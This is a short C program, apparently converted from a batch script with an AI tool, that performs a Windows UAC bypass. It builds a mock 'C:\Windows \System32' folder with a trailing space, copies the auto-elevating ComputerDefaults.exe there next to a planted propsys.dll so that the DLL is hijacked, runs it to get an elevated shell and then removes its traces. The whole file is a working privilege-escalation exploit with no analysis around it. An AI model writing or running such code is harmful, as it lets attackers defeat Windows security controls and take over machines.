#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

/**********************
Convert Batch script to C language using AI (ChatGPT).
**********************/

int main() {
    // Create directories
    printf("[+] Creating directories...\n");
    system("mkdir \"\\\\?\\C:\\Windows \" ");
    system("mkdir \"\\\\?\\C:\\Windows \\System32\"");
    
    // Copy files
    printf("[+] Copying files...\n");
    system("copy C:\\Windows\\System32\\ComputerDefaults.exe C:\\Windows \\System32\\");
    system("copy propsys.dll C:\\Windows \\System32\\");
    
    // Execute file
    printf("[-] Executing file...\n");
    system("C:\\Windows \\System32\\ComputerDefaults.exe");
    printf("[-] Got Elevated Shell........ ?\n");
    
    // Delete files and remove directories
    printf("[+] Cleaning up...\n");
    system("del /q C:\\Windows \\System32\\*");
    system("rmdir C:\\Windows \\System32");
    system("rmdir C:\\Windows ");
    
    return 0;
}
